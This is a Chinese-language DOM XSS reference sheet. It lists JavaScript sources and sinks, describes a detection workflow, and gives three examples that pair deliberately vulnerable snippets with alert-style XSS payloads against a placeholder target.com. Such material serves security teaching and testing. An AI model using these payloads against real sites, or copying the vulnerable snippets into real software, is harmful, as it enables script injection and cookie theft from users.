# DOM XSS 参考手册

## 危险 Source（数据来源）

用户可控的数据进入 JavaScript 执行环境的入口点。

### URL 相关

```javascript
location
location.href
location.search
location.hash
location.pathname
document.URL
document.documentURI
document.referrer
```

### 存储相关

```javascript
localStorage
sessionStorage
```

### 消息相关

```javascript
window.name
postMessage
```

## 危险 Sink（执行点）

接收不可信数据并可能导致代码执行的 API。

### 代码执行

```javascript
eval()
setTimeout()
setInterval()
Function()
execScript()
```

### HTML 注入

```javascript
innerHTML
outerHTML
document.write()
document.writeln()
```

### URL 跳转

```javascript
location
location.href
location.assign()
location.replace()
window.open()
```

### jQuery 相关

```javascript
jQuery.html()
jQuery.append()
jQuery.prepend()
jQuery.after()
jQuery.before()
$(user_input)
```

## DOM XSS 检测流程

1. **识别 Source**：搜索 JavaScript 代码中对 `location`、`document.URL`、`window.name` 等的引用
2. **追踪数据流**：从 Source 跟踪数据如何传递到 Sink
3. **构造 Payload**：根据 Sink 类型选择合适的 payload

### 示例：innerHTML Sink

```javascript
// 漏洞代码
var x = location.hash.slice(1);
document.getElementById('output').innerHTML = x;

// 利用 payload
http://target.com/page#<img src=x onerror=alert(1)>
```

### 示例：eval Sink

```javascript
// 漏洞代码
var x = location.search.split('=')[1];
eval(x);

// 利用 payload
http://target.com/page?input=alert(document.cookie)
```

### 示例：document.write Sink

```javascript
// 漏洞代码
document.write('<img src="' + location.hash.slice(1) + '">');

// 利用 payload
http://target.com/page#" onerror="alert(1)
```
